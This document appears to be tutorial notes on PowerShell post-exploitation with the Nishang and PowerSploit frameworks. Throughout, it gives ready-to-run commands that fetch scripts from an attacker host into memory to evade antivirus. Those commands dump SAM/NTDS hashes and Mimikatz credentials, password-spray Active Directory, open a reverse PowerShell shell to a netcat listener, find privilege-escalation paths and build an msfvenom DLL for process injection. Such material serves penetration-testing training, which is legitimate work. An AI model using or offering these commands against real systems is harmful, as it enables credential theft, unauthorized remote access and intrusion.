# Post Exploitation with PowerShell


Lets explore some other tools we can utilize for Post-Exploitation, which is where our ability to leverage
PowerShell really starts to shine



First lets explore another excellent post exploitation framework, known as Nishang, by Nikhil Mittal

Nishang brings together some of the best tools from other frameworks, in addition to Nishang-native tools
as well


# Important

As we mentioned previously about AV and the detection of PowerShell and other exploitation frameworks,
Nishang is no exception, and its various modules will likely be detected if imported directly to the target
system

Therefore, its important to make sure that most of the tools and scripts we invoke get invoked via download
cradles that support in-memory execution. For most of the examples that follow, we'll be using the 
Net.WebClient and DownloadString method to execute our scripts in memory

Once we've hosted the Nishang framework scripts on our attacker machine, we can begin



# Nishang - Gather

These Gather modules will help us get information from our target system locally, that we could potentially
use to move laterally for instance


The Copy-VSS module wil attempt to copy the SAM database using the VSS service, and if run on a domain
controller, will try and copy the NTDS.dit and contents of the system registry hive

We can try it with the following command

PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/copy-vss.ps1"); Copy-VSS


The command shown above will copy the contents of the SYSTEM registry hive and the SAM file to the current
working directory on the target

These can be cracked offline



The Get Information cmdlet will get us a good deal of system information including:

PuTTY trusted hosts
PuTTY Saved sessions
Recently used commands
Shares on the target machine
Environment Variables
Current user details
SNMP information
Installed applications
Domain Name
Contents of hosts file
Running Services
Account Policy
Local Users
Local Groups
WLAN Info


We can download it and execute it in memory with our Net.WebClient DownloadString download cradle:

iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-Information.ps1'); Get-Information



Get-PassHints we can use to dump the saved Password Hints for users on the system

iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-PassHints'); Get-PassHints



The Invoke-Mimikatz cmdlet will dump clear text credentials (or hashes) from memory. Note, that we can also 
pass command line parameters to any of the modules that have additional options as part of our download
cradle commands: 

iex (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz'); Invoke-Mimikatz -DumpCreds

There are plenty of other gather modules which will come in handy for our post-exploitation purposes:

# Nishang Brute-Forcing MSSQL, Active Directory, WEB, and FTP



As part of its catalog, Nishang includes a great brute force tool called Invoke-BruteForce. We
can use this to brute Active Directory accounts, SQL servers, Web or ftp servers. The great thing about a
brute force tool written in PowerShell is that we can execute the attack from our target host as long as
we copy a file containing usernames and passwords to our target


PS C:\> Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp/pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose


Invoke-BruteForce is also a great tool for executing a password spray attack against Active Directory

Just ensure that your password list contains a single password


# Reverse PowerShell Shell (NetCat)

The Invoke-PowerShellTcp cmdlet within the Nishang framework provides an excellent way to obtain a 
reverse PowerShell Shell from our target host back to a netcat listener

keep in mind if using this method, that the traffic is traversing the wire in cleartext between attacker
and target


Although a great and undetected (by antivirus) method to get a reverse shel from PowerShell, over-the-wire
heuristics (SIEM) may pick up some of the back and forth chatter if that type of solution has been
implemented within an organization

To use this, we should first fire up a NetCat listener on our attacker machine

We will configure it on port 4444 for this example

nc -lvnp 4444


Next we can simply invoke it using a download cradle from the target system, this time, from a windows
command prompt on the target

C:\> powershell.exe -Command iex (New-Object Net.WebClient).DownloadString('http://attacker_URL/Invoke_PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAdress <listener_IP> -port 4444


On our listener we should recieve a connect back from the target into a PowerShell prompt


There are several different shells, both bind, reverse, ICMP, UDP shells, and some more complex "rat"-type
shells we can utilize from Nishang:

Invoke-JSRatRegsvr.ps1
Invoke-JSRatRundll.ps1
Invoke-PoshRatHttp.ps1
Invoke-PoshRatHttps.ps1
Invoke-PowerShellcmp.ps1
Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcpOneLine.ps1
Invoke-PowerShellTcpOneLineBind.ps1
Invoke-PowerShellUdp.ps1
Invoke-PowerShellUdpOneLine.ps1
Invoke-PowerShellWmi.ps1
Invoke-PsGcat.ps1
Invoke-PsGcatAgent.ps1
Remove-PoshRat.ps1



In addition to the Gather and other modules we've covered, we can find a script for mostly any phase of our
post-exploitation within the Nishang Framework with utilities in the following categories: 

Active Directory 	Escalation		Pivot
Antak-WebShell		Execution 	Prasadhak
Backdoors		    Gather		Scan
Bypass				MITM 		Shells
Client 				Misc		Utility



# PowerSploit for Post-Exploitation


As with other frameworks, with PowerSploit there are several categories we can use for our post-exploitation
purposes

AntivirusBypass
Code Execution
Exfiltration
Mayhem
Persistence
Privesc
Recon
ScriptModification



# PowerUp Module


One which we should cover here and offers a good starting point in the identification of misconfigs, is the
PowerUp module within the Privesc category

We can first import the Privesc.psm1 module from within the Privesc modules directory and have a look at some
of the options we have 

PS C:\Modules\PowerSploit\Privesc> Import-Module .\Privesc.psm1


PS C:\> Get-Command -Module Privesc


After running the previous command we can see that the PowerUp module has plenty of options for us to
explore. Of course we can run any of those functions or scripts, but this module includes an Invoke-AllChecks
function

Invoke-AllChecks will run all functions related to the Privesc module looking for misconfigurations,
permissions issues with services, opportunities for DLL hijacking a number of useful checks

We can invoke it on the target after we've imported the Prives.psm1 module with the following command

PS C:\> Invoke-AllChecks


The output will also indicate an AbuseFunction we can use to further exploit the target. In the case with
the following example (screenshot in folder) PowerUp indentified a potential service binary we can install 
with the Install-ServiceBinary -Name'ClickToRunSvc' command


PowerUp also gives the option to save all results to an HTML file with the -HTMLReport flag and will
generate an HTML file we can use to investigate any paths to privilege escalation

The file will be saved in the current directory Invoke-AllChecks was run from and will be in
"MACHINENAME.USERNNAME.html" naming format

PS C:\> Invoke-AllChecks -HTMLReport


# DLL Injection

The CodeInjection category in PowerSploit gives us some options in regard to several methods we can inject 
our own code into existing processes on the target system, whether it be via DLL Injection, injection our 
own custom Shellcode into an existing process, or using WMI to execute commands on the target

The one we will cover here is the Invoke-DLLInjection script as it is the most commonly used

this function injects an attacker-defined DLL into any existing process ID on the target system


the first requirement, of course, is that we generate a DLL for demonstration purposes

This can be done a number of ways, but most commonly, we can just use Metasploits msfvenom to generate
one with the following command:


msfvenom -p windows/exec CMD="cmd.exe" -f dll > cmd.dll

This command will wimply execute a cmd.exe prompt on the target when injected
